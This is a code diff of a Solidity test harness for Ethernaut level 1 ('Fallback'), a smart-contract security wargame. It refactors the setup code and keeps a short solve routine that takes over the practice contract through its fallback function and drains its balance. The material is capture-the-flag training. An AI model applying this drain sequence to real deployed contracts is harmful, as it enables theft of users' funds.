@@ -14,32 +14,11 @@ interface IFallback {
 }
 
 contract Ethernaut01 is EthernautTest {
-    function setUp() public {
-        initialize(address(0x9CB391dbcD447E645D6Cb55dE6ca23164130D008));
-    }
+    constructor() EthernautTest(1) {}
 
-    function run() public {
-        setUp();
-        deploy();
-        solve();
-        submit(me);
-    }
-
-    function test() public {
-        testMode = true;
-        deploy();
-        solve();
-        submit(me);
-    }
-
-    function solve() internal {
-        broadcastOrPrank();
+    function solve() internal override(EthernautTest) {
         IFallback(instance).contribute{value: 1}();
-
-        broadcastOrPrank();
         instance.call{value: 1}("");
-
-        broadcastOrPrank();
         IFallback(instance).withdraw();
 
         require(instance.balance == 0);
